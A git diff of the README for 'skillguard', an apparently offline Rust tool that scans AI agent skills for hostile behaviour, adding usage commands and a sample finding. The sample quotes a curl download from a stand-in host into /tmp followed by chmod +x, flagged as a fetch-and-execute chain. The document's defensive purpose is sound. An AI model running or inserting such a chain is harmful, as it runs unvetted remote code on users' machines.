@@ -93,31 +93,84 @@ its actual behaviour.** That is where this project lives.
 
 ## Design constraints
 
-1. **Zero LLM in the core.** Every verdict is deterministic — regex, AST, YAML
-   parser, SHA256, SPDX, git. No model is called, ever.
-2. **Fully offline.** Scanning uploads nothing anywhere. Your skills never leave
-   your machine.
-3. **The scanner never executes what it scans.** No `npm install`, no
-   `subprocess` on scanned files, no network. The scanned skill is hostile input.
-4. **Evidence, not verdicts.** Every finding carries `file`, `line`, and the
-   original text. No evidence, no finding.
-5. **Single Rust binary.** No Node, no Python, no runtime deps in CI.
+1. **Zero LLM in the core.** Every verdict is deterministic.
+2. **Fully offline.** Scanning uploads nothing anywhere.
+3. **The scanner never executes what it scans.**
+4. **Evidence, not verdicts.**
+5. **Single Rust binary.**
 
 ## Status
 
-Research and architecture complete. See [docs/](docs/).
+Research and architecture complete. **Phase 1 scanner is working**: 51 rules, offline,
+deterministic, 111 tests green, `cargo clippy -D warnings` clean.
 
+- [Phase 0 Corpus Study](docs/PHASE0_CORPUS_STUDY.md) — the plan to produce the
+  first large-scale empirical measurement of the skill ecosystem.
 - [**Feasibility, Direction & GTM**](docs/VIABILITY.md) — **read this first.**
-  Market data, why "package manager" is the wrong framing, where the real gap is,
-  and the phased go-to-market plan.
-- [**Phase 0 Corpus Study**](docs/PHASE0_CORPUS_STUDY.md) — the plan to produce the
-  first large-scale empirical measurement of the skill ecosystem. High visibility,
-  near-zero cost, and it becomes our permanent regression benchmark.
-- [Competitive Analysis](docs/COMPETITIVE_ANALYSIS.md) — 13 projects surveyed,
-  what each already does, and where the gaps actually are
+  Market data, why "package manager" is the wrong framing, and the phased plan.
+- [Competitive Analysis](docs/COMPETITIVE_ANALYSIS.md) — 13 projects surveyed
 - [Architecture](docs/ARCHITECTURE.md) — crate layout, data flow, invariants
 - [Threat Model](docs/THREAT_MODEL.md) — T1–T16, including attacks on the scanner
 - [MVP Roadmap](docs/MVP.md) — phased scope with exit criteria
+
+## Install
+
+```bash
+cargo install --path .          # from a clone
+```
+
+Requires Rust 1.78+. Git is only needed for provenance in later phases.
+
+## Use
+
+```bash
+skillguard scan ./my-skill              # evidence-grade report
+skillguard scan --format sarif ./skills # for GitHub Code Scanning
+skillguard scan --fail-on high .        # CI gate
+skillguard inspect ./my-skill           # capabilities only, no judgement
+skillguard rules                        # the rule catalogue
+```
+
+Exit codes: `0` clean · `1` findings at/above `--fail-on` · `2` integrity · `3` usage.
+
+### What a finding looks like
+
+```text
+  download-execute
+    Sets up the workspace quickly.
+    14 finding(s): 2 critical, 5 high, 4 medium, 3 low, 0 info
+
+    observed capabilities (from executable files only)
+      network: get.workspace-tools.example.net
+      shell: bash, chmod, crontab, curl, sudo
+      fs read: /tmp/ws-installer
+
+    CRITICAL  scripts/setup.sh:5  [DL_CHAIN_FETCH_EXECUTE]
+      fetch -> execute chain: content is downloaded, made runnable, then run
+          5 | curl -sSL https://get.workspace-tools.example.net/install -o /tmp/ws-installer
+             -> fetch
+          6 | chmod +x /tmp/ws-installer
+             -> execute sink
+      capability: shell.execute
+```
+
+Every finding carries a file, a line, and the original text. No evidence, no
+finding.
+
+## Design constraints
+
+1. **Zero LLM in the core.** Every verdict is deterministic — regex, SHA256,
+   SPDX-aware license comparison, git. No model is called, ever.
+2. **Fully offline.** Scanning uploads nothing anywhere.
+3. **The scanner never executes what it scans.** No `npm install`, no
+   subprocess on scanned files, no network. The scanned skill is hostile input,
+   and the scanner is built to survive that: symlink escapes, path traversal,
+   parser bombs, terminal-injection and lockfile poisoning are all handled
+   explicitly ([docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) T11–T16).
+4. **Evidence, not verdicts.** Documentation that merely *mentions* `~/.ssh` is
+   reported at low confidence; the same string in `scripts/` is a finding. That
+   distinction is what makes the tool usable on real skills.
+5. **Single Rust binary.** No Node, no Python, no runtime dependencies in CI.
 
 ## Where the ecosystem actually stands
 
@@ -131,8 +184,8 @@ Research and architecture complete. See [docs/](docs/).
 
 | Phase | Scope | Status |
 |---|---|---|
-| **0** | 100k-skill corpus study, public dataset, benchmark | planned |
-| 1 | Parser, finding model, scanner | planned |
+| **0** | 100k-skill corpus study, public dataset, benchmark | next |
+| **1** | Parser, finding model, scanner | **done** |
 | 2 | Capability model, declared vs observed | planned |
 | 3 | Policy engine, approval lockfile | planned |
 | 4 | CI / SARIF / GitHub Action / rule registry | planned |
